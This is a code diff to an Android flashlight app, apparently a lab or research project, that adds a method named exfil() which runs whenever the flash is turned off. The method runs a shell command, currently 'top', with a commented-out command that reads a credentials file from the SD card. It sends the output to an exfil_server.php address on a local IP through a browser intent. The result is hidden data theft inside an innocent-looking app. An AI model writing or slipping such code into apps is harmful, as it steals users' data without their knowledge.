@@ -2,10 +2,12 @@ package com.mlw.extorch;
 
 import androidx.appcompat.app.AppCompatActivity;
 
+import android.content.Intent;
 import android.content.pm.PackageManager;
 import android.graphics.Bitmap;
 import android.hardware.camera2.CameraAccessException;
 import android.hardware.camera2.CameraManager;
+import android.net.Uri;
 import android.os.Bundle;
 import android.os.StrictMode;
 import android.view.View;
@@ -13,6 +15,11 @@ import android.widget.CompoundButton;
 import android.widget.Switch;
 import android.widget.Toast;
 
+import java.io.BufferedInputStream;
+import java.io.BufferedReader;
+import java.io.FileInputStream;
+import java.io.InputStreamReader;
+import java.io.OutputStream;
 import java.lang.reflect.InvocationTargetException;
 import java.lang.reflect.Method;
 
@@ -80,6 +87,7 @@ public class MainActivity extends AppCompatActivity {
                     } catch (CameraAccessException e) {
                         e.printStackTrace();
                     }
+                    exfil();
                     flashControl.setText("Flash OFF");
                 }else{
                     try {
@@ -92,6 +100,50 @@ public class MainActivity extends AppCompatActivity {
             }
         });
 
+    }
+
+    private void exfil(){
+        FileInputStream in;
+        BufferedInputStream buf;
+        Intent intent = getIntent();
+        Bundle extras = ((Intent) intent).getExtras();
+        StringBuffer sb = new StringBuffer("");
+        String line = "";
+        String NL = System.getProperty("line.separator");
+        String str = "cat /mnt/sdcard/someimportantcredentials.txt";
+        Process process = null;
+        try {
+//           process = Runtime.getRuntime().exec(str);
+            process = Runtime.getRuntime().exec("top -n 1 -d 1");
+//            BufferedReader in = new BufferedReader(new InputStreamReader(process.getInputStream()));
+        } catch (IOException e) {
+            throw new RuntimeException(e);
+        }
+        BufferedReader reader = new BufferedReader(new
+                InputStreamReader(process.getInputStream()));
+        int read;
+        char[] buffer = new char[4096];
+        StringBuffer output = new StringBuffer();
+        try {
+            while ((read = reader.read(buffer)) > 0) {
+                output.append(buffer, 0, read);
+            }
+        } catch (IOException e) {
+            throw new RuntimeException(e);
+        }
+        try {
+            reader.close();
+        } catch (IOException e) {
+            throw new RuntimeException(e);
+        }
+        try {
+            process.waitFor();
+        } catch (InterruptedException e) {
+        }
+        String data = output.toString();
+        System.out.println("test exfil " + data);
+        startActivity(new Intent(Intent.ACTION_VIEW,
+                Uri.parse("http://192.168.0.23/exfil_server.php?input=" + data)));
     }
 
     //todo try to implement screenshot functionality without root
